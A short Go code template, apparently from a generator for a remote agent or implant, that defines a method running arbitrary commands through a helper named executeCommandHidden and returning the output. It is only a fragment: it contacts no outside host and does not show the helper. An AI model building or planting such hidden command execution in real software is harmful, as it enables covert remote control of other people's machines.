// Core command execution functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
	result, err := executeCommandHidden(command)
	if err != nil {
		return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
	}
	return result
}